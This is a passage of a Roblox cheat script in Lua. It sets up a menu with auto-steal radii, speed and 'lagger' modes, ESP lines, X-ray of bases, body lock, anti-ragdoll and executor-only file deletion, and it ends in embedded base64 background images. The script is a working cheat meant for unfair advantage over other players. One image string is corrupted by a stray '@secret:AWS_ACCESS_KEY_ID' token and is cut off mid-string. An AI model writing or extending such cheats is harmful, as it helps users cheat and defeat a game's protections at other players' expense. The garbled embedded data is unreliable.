NS, CS = 59.5, 28.8; S.NS, S.CS = 59.5, 28.8; S.LAGGER_SPEED, S.LAGGER_CARRY_SPEED = 24.5, 15; S.autoTPHeight = 20; S.autoCarrySpeedEnabled = false; S.safeModeEnabled = false; S.autoSwingEnabled = true; S.informationE01Enabled = true; S.guiLocked = false; S.lockMobileButtons = false; S.moveButtons = false; S.progressBarScale = 100; S.hideMobileButtons = false; S.mobileButtonScale = 0.70; S.autoSaveEnabled = true; S.autoLeftEnabled = false; S.autoRightEnabled = false; S.dropActive = false; S.noPlayerCollisionEnabled = false; S.showTracerEnabled = false; S.ragdollCountdownEnabled = false; S.ragdollStealEnabled = false; pcall(function() RagdollGrab.clear() end); S.autoResetOnMedEnabled = false; S.medusaCounterEnabled = false; S.medusaResetEnabled = false; S.batCounterEnabled = false; S.unwalkEnabled = false; S.antiLagEnabled = false; pcall(function() F.setMotionBlur(false); F.setXRayBases(false); F.setXRayBrainrots(false) end); S.stretchRezEnabled = false; S.antiRagdollEnabled = false; S.duelsAntiDropEnabled = false; pcall(function() F.stopDuelsAntiDrop() end); S.autoTPEnabled = false; S.autoBatEnabled = false; if S.autoBatV2Enabled and F.stopBatV2 then F.stopBatV2() end; S.autoBatV2Enabled = false; S.speedMode = false; S.laggerToggled = false; S.laggerPhase = 0; KB.DropBrainrot = {kb=Enum.KeyCode.H, gp=nil}; KB.AutoLeft = {kb=Enum.KeyCode.Z, gp=nil}; KB.AutoRight = {kb=Enum.KeyCode.C, gp=nil}; KB.AutoBat = {kb=Enum.KeyCode.E, gp=nil}; KB.TPBat = {kb=Enum.KeyCode.V, gp=Enum.KeyCode.ButtonY}; KB.BatV2 = {kb=Enum.KeyCode.X, gp=nil}; KB.TPFloor = {kb=Enum.KeyCode.F, gp=nil}; KB.InstaReset = {kb=Enum.KeyCode.T, gp=nil}; KB.AntiTPBat = {kb=Enum.KeyCode.B, gp=nil}; KB.GuiHide = {kb=Enum.KeyCode.LeftControl, gp=nil}; KB.SpeedToggle = {kb=Enum.KeyCode.Q, gp=nil}; KB.LaggerToggle = {kb=Enum.KeyCode.R, gp=nil}; TP_BAT_KEY = Enum.KeyCode.V; TP_BAT_CONTROLLER = Enum.KeyCode.ButtonY; tpBatMode = 1
pcall(function() selectedStealMode = "Normal" AceStealRadii = AceStealRadii or {Normal=55, Semi=20}; AceStealRadii.Normal = 55; AceStealRadii.Semi = 20; autoStealRadius = 55 if Steal then Steal.StealRadius = 55; Steal.StealDuration = 1.3 end autoGrabStopEnabled = false end) pcall(function() if K7 then K7.lineESPEnabled = false; K7.speedESPEnabled = false; K7.fovEnabled = false; K7.bodyLockEnabled = false; K7.bodyLockRadius = 60; K7.headlessEnabled = false; K7.korbloxEnabled = false; K7.animPackEnabled = false if K7.refreshESP then K7.refreshESP() end end end)
_G.VersincMobileButtonPositions = {} pcall(function() if F.resetMobileButtons then F.resetMobileButtons() end end) pcall(function() if F.applyMobileButtonsHidden then F.applyMobileButtonsHidden() end end) pcall(function() if _G._VersincApplyGuiScale then _G._VersincApplyGuiScale(1) end end) pcall(function() local df = delfile or (syn and syn.delfile) if df then if _isfile(CONFIG_FILE) then df(CONFIG_FILE) end if _isfile(CONFIG_FILE_LEGACY) then df(CONFIG_FILE_LEGACY) end elseif _writefile then _writefile(CONFIG_FILE, "{}"); _writefile(CONFIG_FILE_LEGACY, "{}") end end) _savedCfg = nil
pcall(function() if UI.normalBox then UI.normalBox.Text = "60" end if UI.carryBox then UI.carryBox.Text = "30" end if UI.laggerBox then UI.laggerBox.Text = "15" end if UI.laggerCarryBox then UI.laggerCarryBox.Text = "24.5" end if UI.autoTPHeightBox then UI.autoTPHeightBox.Text = "20" end if UI.radInput then UI.radInput.Text = "55" end if UI.stealModeLbl then UI.stealModeLbl.Text = "Normal" end if UI.mobileSizeLbl then UI.mobileSizeLbl.Text = "0.80" end if F.refreshSpeedModeLabel then F.refreshSpeedModeLabel() end end) local visualOff = {
"setAntiRagVisual","setDuelsAntiDropVisual","setMysteryAntiBatVisual","setInfJumpVisual","setTPBatVisual","setAutoTPVisual","setUnwalkVisual", "setAntiLagVisual","setMotionBlurVisual","setXRayBasesVisual","setXRayBrainrotsVisual","setStretchRezVisual","setShowTracerVisual","setRagdollCdVisual", "setRagdollStealVisual", "setNoPlayerCollisionVisual","setSafeModeVisual","setMedusaVisual","setMedusaResetVisual", "setAutoResetOnMedVisual","setBatCounterVisual", "setAutoSwingVisual", "setInformationE01Visual","setLockGuiVisual","setHideMobileVisual","setLineESPVisual", "setSpeedESPVisual","setBodyLockVisual","setHeadlessVisual","setKorbloxVisual","setAnimPackVisual", "setFOVVisual", } for _, name in ipairs(visualOff) do
pcall(function() if VS[name] then VS[name](false) end end) end pcall(function() if S.setAutoCarrySpeedVisual then S.setAutoCarrySpeedVisual(false) end end) pcall(function() if S.autoBatSetVisual then S.autoBatSetVisual(false) end end) pcall(function() if S.autoLeftSetVisual then S.autoLeftSetVisual(false) end end) pcall(function() if S.autoRightSetVisual then S.autoRightSetVisual(false) end end) pcall(function() if UI.saveStatusLbl then UI.saveStatusLbl.Text = "Config reset" end end) local ok = F.saveConfig(true) if UI and UI.saveStatusLbl then
UI.saveStatusLbl.Text = ok and "Config reset OK" or "Reset done (save fail)"; UI.saveStatusLbl.TextColor3 = ok and Color3.fromRGB(100, 220, 160) or Color3.fromRGB(255, 200, 100) end print("[Zombie.Vs] All configs reset to defaults") return ok end VS = VS or {}; UI = UI or {} function F.refreshSpeedModeLabel() if modeValLbl then modeValLbl.Text=S.laggerToggled and (S.laggerPhase==2 and "Lagger Carry" or "Lagger Normal") or (S.speedMode and "Carry" or "Normal") end end function F.getSpeedModeName() if S.laggerToggled then return (S.laggerPhase == 2) and "Lagger Carry" or "Lagger"
elseif S.speedMode then return "Carry" end return "Normal" end function F.setSpeedModeName(mode) if mode == "Lagger Carry" then S.laggerToggled = true; S.speedMode = false; S.laggerPhase = 2 elseif mode == "Lagger" then S.laggerToggled = true; S.speedMode = false; S.laggerPhase = 1 elseif mode == "Carry" then S.laggerToggled = false; S.speedMode = true; S.laggerPhase = 0 else S.laggerToggled = false; S.speedMode = false; S.laggerPhase = 0 end F.refreshSpeedModeLabel() end function F.isCarryName(name) local n = tostring(name or ""):lower()
return n:find("brainrot") or n:find("animal") or n:find("carry") or n:find("grab") or n:find("steal") or n:find("hold") end function F.isIgnoredCarryTool(name) local n = tostring(name or ""):lower() return n:find("bat") or n:find("slap") or n:find("medusa") or n:find("head") or n:find("stone") end function F.isCarryingBrainrot(char) if not char then return false end for _, name in ipairs({"Carrying", "IsCarrying", "Grabbed", "Holding", "StealHold", "HasGrab"}) do local v = char:FindFirstChild(name, true) if v then if v:IsA("BoolValue") and v.Value then return true end
if v:IsA("ObjectValue") and v.Value then return true end if v:IsA("StringValue") and v.Value ~= "" then return true end end end for _, child in ipairs(char:GetChildren()) do if child:IsA("Model") and child:FindFirstChildWhichIsA("BasePart", true) then if child:FindFirstChildOfClass("Humanoid") and child:FindFirstChild("HumanoidRootPart") then return true end if F.isCarryName(child.Name) then return true end elseif child:IsA("Tool") and not F.isIgnoredCarryTool(child.Name) then return true end end return false end function F.enableCarrySpeedForSteal()
S._autoCarryWaitingPickup = false; S._autoCarryPickupUntil = 0 if not S._autoCarryFromSteal then S._autoCarryReturnMode = F.getSpeedModeName() end S._autoCarryFromSteal = true; S._autoCarryGraceUntil = tick() + 0.75 local wasLagger = (S._autoCarryReturnMode == "Lagger" or S._autoCarryReturnMode == "Lagger Carry" or F.getSpeedModeName() == "Lagger" or F.getSpeedModeName() == "Lagger Carry") if wasLagger then F.setSpeedModeName("Lagger Carry") else F.setSpeedModeName("Carry") end pcall(function() if F.saveConfig then F.saveConfig() end end) end function F.disableAutoCarrySpeed()
if not S._autoCarryFromSteal and not S._autoCarryWaitingPickup then return end local wasAutoApplied = S._autoCarryFromSteal == true; local returnMode = S._autoCarryReturnMode; S._autoCarryFromSteal = false; S._autoCarryWaitingPickup = false; S._autoCarryGraceUntil = 0; S._autoCarryPickupUntil = 0; S._autoCarryReturnMode = nil if not wasAutoApplied then return end if returnMode == "Lagger" or returnMode == "Lagger Carry" then F.setSpeedModeName("Lagger") elseif returnMode == "Carry" then F.setSpeedModeName("Carry") else F.setSpeedModeName("Normal") end
pcall(function() if F.saveConfig then F.saveConfig() end end) end function F.startAutoCarryPickupWatch(seconds) if S.autoCarrySpeedEnabled ~= true then return end S._autoCarryWaitingPickup = true; S._autoCarryPickupUntil = tick() + (seconds or 1.25) end RunService.RenderStepped:Connect(function() if S.autoCarrySpeedEnabled ~= true then if S._autoCarryFromSteal or S._autoCarryWaitingPickup then F.disableAutoCarrySpeed() end return end local char = LP.Character; local hum = char and char:FindFirstChildOfClass("Humanoid"); local root = char and char:FindFirstChild("HumanoidRootPart")
if not char or not hum or not root then F.disableAutoCarrySpeed(); S._stealAttrWasActive = false return end local st = hum:GetState(); local gotHit = st == Enum.HumanoidStateType.Physics or st == Enum.HumanoidStateType.Ragdoll or st == Enum.HumanoidStateType.FallingDown local stealingAttr = false pcall(function() stealingAttr = (LP:GetAttribute("Stealing") == true) end) local carryingBrainrot = F.isCarryingBrainrot(char) if stealingAttr and not S._stealAttrWasActive then S._stealAttrWasActive = true; F.enableCarrySpeedForSteal() elseif not stealingAttr then S._stealAttrWasActive = false end
if S._autoCarryWaitingPickup then if gotHit or tick() > (S._autoCarryPickupUntil or 0) then S._autoCarryWaitingPickup = false; S._autoCarryPickupUntil = 0 elseif carryingBrainrot then F.enableCarrySpeedForSteal() end end if carryingBrainrot and not S._autoCarryFromSteal then F.enableCarrySpeedForSteal() end if S._autoCarryFromSteal then local graceDone = tick() > (S._autoCarryGraceUntil or 0) if gotHit or (graceDone and not carryingBrainrot and not stealingAttr) then F.disableAutoCarrySpeed() end end end) function F.toggleCarryMode() if S.laggerToggled then
S.laggerToggled=false; S.laggerPhase=0; S.speedMode=true else S.speedMode=not S.speedMode end F.refreshSpeedModeLabel() end function F.toggleLaggerMode() if not S.laggerToggled then S.speedMode=false; S.laggerToggled=true; S.laggerPhase=2 elseif S.laggerPhase==2 then S.laggerPhase=1 else S.laggerPhase=2 end F.refreshSpeedModeLabel() end function F.buildGui() local COLORS = { bg = Color3.fromRGB(8,18,48), row = Color3.fromRGB(8,18,48), row2 = Color3.fromRGB(10,22,55), stroke = Color3.fromRGB(45,130,230), strokeSoft = Color3.fromRGB(25,90,185), white = Color3.fromRGB(225,230,240), textDim = Color3.fromRGB(70,115,180), toggleBg = Color3.fromRGB(6,14,38), knob = Color3.fromRGB(240,245,255), accent = Color3.fromRGB(45,130,230), accentStrong = Color3.fromRGB(45,130,230), on = Color3.fromRGB(20,72,160), off = Color3.fromRGB(6,14,38), } local THEME_PRESETS = { { name = "WAVE", color = Color3.fromRGB(45,130,230) }, { name = "BLUE",   color = Color3.fromRGB(58, 128, 245) }, { name = "PURPLE", color = Color3.fromRGB(170, 80, 255) }, { name = "PINK",   color = Color3.fromRGB(255, 90, 200) }, { name = "YELLOW", color = Color3.fromRGB(255, 214, 0) }, { name = "WHITE",  color = Color3.fromRGB(245, 245, 247) },
{ name = "GREEN",  color = Color3.fromRGB(60, 200, 120) }, { name = "RED",    color = Color3.fromRGB(232, 52, 68) }, { name = "CYAN",   color = Color3.fromRGB(80, 220, 255) }, } local BG_EMBED = {
["Neon"] = [[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]],
["Wave"] = [[/9j/4AAQSkZJRgABAQAAAQABAAD/2wBDAA8LDA0MCg8NDA0REA8SFyYZFxUVFy8iJBwmODE7OjcxNjU9RVhLPUFUQjU2TWlOVFteY2RjPEpsdGxgc1hhY1//2wBDARARERcUFy0ZGS1fPzY/X19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX1//wAARCAGkAaQDASIAAhEBAxEB/8QAHAABA@secret:AWS_ACCESS_KEY_IDAQFAgMGBwEI/8QARxAAAgEDAwIDBQcCAwcEAQIHAQIDAAQRBRIhMUETUWEGFCJxgSMyQpGhscEV0VJi8CQzQ3KC4fEHFlOSYzVEVHODk6Ky4v/EABUBAQEAAAAAAAAAAAAAAAAAAAAB/8QAFBEBAAAAAAAAAAAAAAAAAAAAAP/aAAwDAQACEQMRAD8A87pSlApSlApSlApSlApSlApSlApSlApSlApSlApSlApSlApSlApSlApSlApSlApSlApSlApSlApSlApSlApSlApSlApSlApSlApSlApSlApSlApSlApSlApSlApSlApSlApSlApSlApSlApSlApSlApSlApSlApSlApSlApSlApSlApSlApSlApSlApSlApSlApSlApSlApSlApSlApSlApSlApSlApSlApSlApSlApSlApSlApSlApSlApSlApSlApSlApSlApSlApSlApSlApSlApSlApSlApSlApSlApSlApSlApSlApSlApSlApSlApSlApSlApSlApSlApSlApSlApSlApSlApSlApSlApSlApSlApSlApSlApSlApSlApSlApSlApSlApSlApSlApSlApSlApSlApSlApSlApSlApSlApSlApSlApSlApSlApSlApSlApSlApSlApSlApSlApSlApSlApSlApSlApSlApSlApSlApSlApSlApSlApSlApSlApSlApSlApSlApSlApSlApSlApSlApSlApSlApSlApSlApSlApSlApWSqWIVeSeAB3q/i9jNflt1mSxOG6KzqrfkTQc9SuhT2K9oWP/AOnkfORR/Nab72V1uwjMk9hIUHJaMhwPnigpKUIxSgUpSgUpSgUpSgUpSgUpSgUpSgUpSgUpSgUpSgUpSgUpSgUpSgUpSgUpSgUpSgUpSgUpSgUpSgUpSgUpSgUpSgUqZpum3ep3S21nCZJG6+SjzJ7CvTdG9htMsole+QXlxj4i/wBwfIf3oPM9P0m/1OUR2NrJMc8lR8I+Z6Cu40n/ANOwAJ